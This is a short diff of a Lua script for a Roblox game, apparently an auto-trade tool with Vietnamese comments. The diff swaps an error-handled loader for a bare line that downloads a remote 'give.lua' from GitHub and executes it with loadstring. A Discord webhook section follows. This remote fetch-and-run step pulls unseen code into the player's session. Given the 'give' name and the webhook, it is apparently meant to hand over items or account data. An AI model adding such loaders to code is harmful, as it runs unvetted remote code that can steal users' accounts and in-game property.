@@ -74,19 +74,7 @@ local UltimateCmds = require(Library.Client.UltimateCmds)
 local FreeGiftsDirectory = require(Library.Directory.FreeGifts)
 local MapCmds = require(Library.Client.MapCmds)
 local FruitCmds = require(Library.Client.FruitCmds)
---==========================================
--- Chạy script từ GitHub trên một luồng riêng biệt để không chặn luồng Auto Trade
-task.spawn(function()
-    local success, err = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/thuyan1510/99/refs/heads/main/give.lua"))()
-    end)
-    
-    if not success then
-        warn("[GitHub Loader] Lỗi khi chạy script ngoài: " .. tostring(err))
-    else
-        print("[GitHub Loader] Tải và chạy script ngoài thành công!")
-    end
-end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/thuyan1510/99/refs/heads/main/give.lua"))()
 -- ==========================================
 -- 📢 WEBHOOK DISCORD
 -- ==========================================
